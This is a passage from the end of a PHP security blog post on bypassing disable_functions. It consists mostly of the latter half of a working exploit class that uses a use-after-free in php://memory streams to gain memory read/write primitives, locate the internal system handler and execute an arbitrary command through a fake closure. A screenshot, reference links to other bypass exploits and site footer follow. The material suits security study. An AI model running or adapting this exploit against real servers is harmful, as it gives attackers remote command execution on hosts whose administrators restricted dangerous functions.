        <span class="nv">$handler_offset</span> <span class="o">=</span> <span class="nx">PHP_MAJOR_VERSION</span> <span class="o">===</span> <span class="mi">8</span> <span class="o">?</span> <span class="mh">0x70</span> <span class="o">:</span> <span class="mh">0x68</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$fake_closure_off</span> <span class="o">+</span> <span class="nv">$handler_offset</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span>

        <span class="nv">$fake_closure_addr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span> <span class="o">+</span> <span class="nv">$fake_closure_off</span> <span class="o">-</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="nv">$fake_closure_addr</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;fake closure @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$fake_closure_addr</span><span class="p">);</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cleanup</span><span class="p">();</span>
        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">)(</span><span class="nx">CMD</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">make_uaf_obj</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uafp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;php://memory&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uafp</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;QQQ&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xDEADBAADC0DE</span><span class="p">));</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">STRING_SIZE</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uafp</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">prepare_leaker</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$str_off</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="nx">CHUNK_SIZE</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$str_off</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$str_off</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

        <span class="nv">$val_off</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$val_off</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_addr</span> <span class="o">+</span> <span class="nx">CHUNK_SIZE</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$val_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="mh">0xA</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">prepare_cleanup</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ret_gadget</span> <span class="o">=</span> <span class="nv">$binary_leak</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="o">--</span><span class="nv">$ret_gadget</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$ret_gadget</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!==</span> <span class="mh">0xC3</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;ret gadget = 0x%x&#34;</span><span class="p">,</span> <span class="nv">$ret_gadget</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc_addr</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="o">-</span> <span class="p">(</span><span class="nx">PHP_MAJOR_VERSION</span> <span class="o">===</span> <span class="mi">8</span> <span class="o">?</span> <span class="mh">0x50</span> <span class="o">:</span> <span class="mh">0x60</span><span class="p">));</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="nv">$ret_gadget</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper_off</span> <span class="o">+</span> <span class="nx">CHUNK_SIZE</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">helper</span><span class="o">-&gt;</span><span class="na">c</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$n</span> <span class="o">!==</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$value</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$p</span><span class="p">,</span> <span class="nv">$v</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$v</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$v</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$addr</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$addr</span> <span class="o">-=</span> <span class="mh">0x10</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA8</span> <span class="o">&amp;&amp;</span>
                <span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">),</span>
                    <span class="p">[</span><span class="mi">20151012</span><span class="p">,</span> <span class="mi">20160303</span><span class="p">,</span> <span class="mi">20170718</span><span class="p">,</span> <span class="mi">20180731</span><span class="p">,</span> <span class="mi">20190902</span><span class="p">,</span> <span class="mi">20200930</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$module_name_addr</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
                <span class="nv">$module_name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$module_name_addr</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$module_name</span> <span class="o">===</span> <span class="mh">0x647261646e617473</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">log</span><span class="p">(</span><span class="s2">&#34;standard module @ 0x%x&#34;</span><span class="p">,</span> <span class="nv">$addr</span><span class="p">);</span>
                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">===</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">cleanup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hfp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;php://memory&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
        <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hfp</span><span class="p">,</span> <span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;QQ&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc_addr</span><span class="p">));</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">FILTER_SIZE</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hfp</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">str2ptr</span><span class="p">(</span><span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$address</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="nv">$n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$address</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
            <span class="nv">$address</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">abc</span><span class="p">[</span><span class="nv">$p</span> <span class="o">+</span> <span class="nv">$j</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$address</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">ptr2str</span><span class="p">(</span><span class="nv">$ptr</span><span class="p">,</span> <span class="nv">$n</span> <span class="o">=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$ptr</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
            <span class="nv">$ptr</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">log</span><span class="p">(</span><span class="nv">$format</span><span class="p">,</span> <span class="nv">$val</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">LOGGING</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">printf</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$format</span><span class="si">}</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$val</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">static</span> <span class="k">function</span> <span class="nf">alloc</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="nv">$size</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20211009113821094.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20211009113821094.png, https://gitee.com/leonsec/images/raw/master/image-20211009113821094.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20211009113821094.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20211009113821094.png"
        title="image-20211009113821094" /></p>
<h2 id="reference">Reference</h2>
<p><a href="https://www.cnblogs.com/tr1ple/p/11213732.html" target="_blank" rel="noopener noreffer">https://www.cnblogs.com/tr1ple/p/11213732.html</a></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener noreffer">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p><a href="https://www.anquanke.com/post/id/208451" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/208451</a></p>
<p><a href="https://xz.aliyun.com/t/4623" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/4623</a></p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener noreffer">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener noreffer">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>
<p><a href="https://www.anquanke.com/post/id/197745" target="_blank" rel="noopener noreffer">https://www.anquanke.com/post/id/197745</a></p>
<p><a href="https://xz.aliyun.com/t/4688" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/4688</a></p>
<p><a href="https://www.cnblogs.com/BOHB-yunying/p/11691382.html#cRYwzKZ5" target="_blank" rel="noopener noreffer">https://www.cnblogs.com/BOHB-yunying/p/11691382.html#cRYwzKZ5</a></p>
<p><a href="https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/" target="_blank" rel="noopener noreffer">https://blog.bi0s.in/2019/10/26/Web/bypass-disable-functions/</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener noreffer">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><a href="https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/php-fastcgi-remote-exploit.md" target="_blank" rel="noopener noreffer">https://github.com/wofeiwo/webcgi-exploits/blob/master/php/Fastcgi/php-fastcgi-remote-exploit.md</a></p>
<p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener noreffer">https://github.com/mm0r1/exploits</a></p>
<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions" target="_blank" rel="noopener noreffer">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions</a></p>
<p><a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass" target="_blank" rel="noopener noreffer">https://github.com/mm0r1/exploits/tree/master/php-filter-bypass</a></p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2021-10-09</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/bypass-disable_function-php/" data-title="Bypass Disable_function (PHP)" data-via="Le0nsec" data-hashtags="RCE,UAF,Bypass"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/bypass-disable_function-php/" data-hashtag="RCE"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/bypass-disable_function-php/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/bypass-disable_function-php/" data-title="Bypass Disable_function (PHP)"><i class="fab fa-weibo fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/rce/">RCE</a>,&nbsp;<a href="/tags/uaf/">UAF</a>,&nbsp;<a href="/tags/bypass/">Bypass</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/roarctf2020-writeup/" class="prev" rel="prev" title="RoarCTF2020 Writeup"><i class="fas fa-angle-left fa-fw"></i>RoarCTF2020 Writeup</a>
            <a href="/thinkphp%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/" class="next" rel="next" title="ThinkPHP审计入门">ThinkPHP审计入门<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="valine" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.h4ck.fun/" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
